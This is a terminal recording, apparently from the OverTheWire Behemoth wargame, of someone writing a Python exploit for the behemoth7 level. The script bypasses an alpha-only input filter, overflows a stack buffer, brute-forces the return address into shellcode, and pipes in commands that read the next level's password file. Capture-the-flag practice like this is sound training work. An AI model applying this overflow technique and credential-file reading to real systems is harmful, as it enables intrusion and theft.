[21.043, "o", "$ cat /tmp/e_behemoth7.py\r\n\u001b[?25l\u001b[32;1H\u001b[1m-- INSERT --\u001b[m\u001b[32;13H\u001b[K\u001b[32;83H0,1\u001b[11CAll\u001b[1;1Himport os, struct, subprocess\u001b[2;1H\u001b[K\u001b[32;83H2\u001b[2;1H\u001b[?25h\u001b[?25l\u001b[3;1H\u001b[K\u001b[32;83H3\u001b[3;1H\u001b[?25h\u001b[?25l# behemoth7: main does\u001b[4;1H\u001b[K\u001b[32;83H4\u001b[4;1H\u001b[?25h\u001b[?25l#     strcpy(buf, argv[1]);\u001b[21C// buf is 0x20c bytes below ebp\u001b[5;1H\u001b[K\u001b[32;83H5\u001b[5;1H\u001b[?25h\u001b[?25l# but BEFORE that it checks argv[1] character by character:\u001b[6;1H\u001b[K\u001b[32;83H6\u001b[6;1H\u001b[?25h\u001b[?25l#     for (i = 0; buf[i] && i <= 0x1ff; i++)\u001b[7;1H\u001b[K\u001b[32;83H7\u001b[7;1H\u001b[?25h\u001b[?25l#\u001b[9Cif (!isalpha(buf[i]) && !isspace(buf[i])) { puts(\"Non-alpha...\"); exit(1); }\u001b[8;1H\u001b[K\u001b[32;83H8\u001b[8;1H\u001b[?25h\u001b[?25l# The check only looks at the FIRST 512 characters. Anything after that is copied\u001b[9;1H\u001b[K\u001b[32;83H9\u001b[9;1H\u001b[?25h\u001b[?25l# by strcpy without being inspected -- so we put 512 letters, then the saved EBP,\u001b[10;1H\u001b[K\u001b[32;83H10,1\u001b[10;1H\u001b[?25h\u001b[?25l# the return address, and the shellcode (which is full of non-alpha bytes).\u001b[11;1H\u001b[K\u001b[32;84H1\u001b[11;1H\u001b[?25h\u001b[?25l#\u001b[12;1H\u001b[K\u001b[32;84H2\u001b[12;1H\u001b[?25h\u001b[?25l# The shellcode was written in /tmp/b7.asm and assembled with nasm; we load the\u001b[13;1H\u001b[K\u001b[32;84H3\u001b[13;1H\u001b[?25h\u001b[?25l# exact bytes (/tmp/b7.bin).\u001b[14;1H\u001b[K\u001b[32;84H4\u001b[14;1H\u001b[?25h\u001b[?25lsc = open(\"/tmp/b7.bin\", \"rb\").read()\u001b[15;1H\u001b[K\u001b[32;84H5\u001b[15;1H\u001b[?25h\u001b[?25lprint(\"shellcode (%d bytes): %s\" % (len(sc), sc.hex()), flush=True)\u001b[16;1H\u001b[K\u001b[32;84H6\u001b[16;1H\u001b[?25h\u001b[?25lassert 0 not in sc, \"argv cannot contain a NUL byte\"\u001b[17;1H\u001b[K\u001b[32;84H7\u001b[17;1H\u001b[?25h\u001b[?25l\u001b[18;1H\u001b[K\u001b[32;84H8\u001b[18;1H\u001b[?25h\u001b[?25l# Layout of argv[1] (buf is at ebp-0x20c):\u001b[19;1H\u001b[K\u001b[32;84H9\u001b[19;1H\u001b[?25h\u001b[?25l#   [0..511]    512 alpha bytes that satisfy the filter\u001b[20;1H\u001b[K\u001b[32;83H20\u001b[20;1H\u001b[?25h\u001b[?25l#   [512..523]  12 more bytes to reach the saved EBP (buf+512..buf+523)\u001b[21;1H\u001b[K\u001b[32;84H1\u001b[21;1H\u001b[?25h\u001b[?25l#   [524..527]  saved EBP (filler)\u001b[22;1H\u001b[K\u001b[32;84H2\u001b[22;1H\u001b[?25h\u001b[?25l#   [528..531]  return address -> shellcode address\u001b[23;1H\u001b[K\u001b[32;84H3\u001b[23;1H\u001b[?25h\u001b[?25l#   [532..]     shellcode\u001b[24;1H\u001b[K\u001b[32;84H4\u001b[24;1H\u001b[?25h\u001b[?25ldef build(addr):\u001b[25;1H\u001b[K\u001b[32;84H5\u001b[25;1H\u001b[?25h\u001b[?25l    return b\"A\" * 512 + b\"A\" * 12 + b\"BBBB\" + struct.pack(\"<I\", addr) + sc\u001b[26;1H\u001b[K\u001b[32;84H6\u001b[26;1H\u001b[?25h\u001b[?25l\u001b[27;1H\u001b[K\u001b[32;84H7\u001b[27;1H\u001b[?25h\u001b[?25l# The addresses are ASLR-independent (ASLR is off) but depend on the environment\u001b[28;1H\u001b[K\u001b[32;84H8\u001b[28;1H\u001b[?25h\u001b[?25l# size, so we sweep 0xffffd000..0xffffe400 and stop on the PWN! marker that the\u001b[29;1H\u001b[K\u001b[32;84H9\u001b[29;1H\u001b[?25h\u001b[?25l# shellcode prints before it spawns the shell.\u001b[30;1H\u001b[K\u001b[32;83H30\u001b[30;1H\u001b[?25h\u001b[?25lprint(\"sweeping return addresses for the shellcode ...\", flush=True)\u001b[31;1H\u001b[K\u001b[32;84H1\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hfound = None\u001b[32;83H\u001b[K\u001b[32;83H32,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hfor addr in range(0xffffd000, 0xffffe400, 4):\u001b[32;83H\u001b[K\u001b[32;83H33,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hp = build(addr)\u001b[32;83H\u001b[K\u001b[32;83H34,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hif 0 in p:\u001b[32;83H\u001b[K\u001b[32;83H35,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hcontinue\u001b[32;83H\u001b[K\u001b[32;83H36,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Htry:\u001b[32;83H\u001b[K\u001b[32;83H37,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hr = subprocess.run([\"/behemoth/behemoth7\", p], capture_output=True,\u001b[32;83H\u001b[K\u001b[32;83H38,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;28Htimeout=3, env={}, input=b\"\")\u001b[32;83H\u001b[K\u001b[32;83H39,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hexcept subprocess.TimeoutExpired:\u001b[32;83H\u001b[K\u001b[32;83H40,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hcontinue\u001b[32;83H\u001b[K\u001b[32;83H41,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hif b\"PWN!\" in r.stdout:\u001b[32;83H\u001b[K\u001b[32;83H42,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hfound = addr\u001b[32;83H\u001b[K\u001b[32;83H43,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hbreak\u001b[32;83H\u001b[K\u001b[32;83H44,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"landed in the shellcode at %s\" % (hex(found) if found else \"NONE\"), "]
[0.000, "o", "flush=True)\u001b[32;83H\u001b[K\u001b[32;83H45,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hif found is None:\u001b[32;83H\u001b[K\u001b[32;83H46,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hraise SystemExit(1)\u001b[32;83H\u001b[K\u001b[32;83H47,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[32;83H\u001b[K\u001b[32;83H48,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H# Feed the shell the commands; it reads the same stdin pipe.\u001b[32;83H\u001b[K\u001b[32;83H49,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hp = subprocess.Popen([\"/behemoth/behemoth7\", build(found)],\u001b[32;83H\u001b[K\u001b[32;83H50,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;22Hstdin=subprocess.PIPE, stdout=subprocess.PIPE,\u001b[32;83H\u001b[K\u001b[32;83H51,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;22Hstderr=subprocess.STDOUT, env={})\u001b[32;83H\u001b[K\u001b[32;83H52,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hout, _ = p.communicate(b\"id\\ncat /etc/behemoth_pass/behemoth8\\nexit\\n\", timeout=15)\u001b[32;83H\u001b[K\u001b[32;83H53,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(out.decode(\"latin-1\"), flush=True)\u001b[32;83H\u001b[K\u001b[32;83H54,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"B7\" + \"DONE\", flush=True)\u001b[32;83H\u001b[K\u001b[32;83H55,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[32;1H\u001b[K\u001b[?25l\u001b[32;83H55,0-1\u001b[8CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[32;83H\u001b[K\u001b[32;1H:wq\r\u001b[?2004l\u001b[>4;m\"/tmp/e_behemoth7.py\" [New] 55L, 2395B written\r\u001b[23;2t\u001b[23;1t\r\r\r\n\u001b[?1004l\u001b[?2004l\u001b[?1l\u001b>\u001b[?1049l\u001b[23;0;0t\u001b[?25h\u001b[>4;m\u001b]3008;end=38cb5536-da59-40fe-bcfb-e1c03083f054;exit=success\u001b\\\u001b]3008;start=9ad8f00f-ae5d-483f-87e2-a2870c2fb164;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=behemoth7;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/behemoth7\u001b\\"]
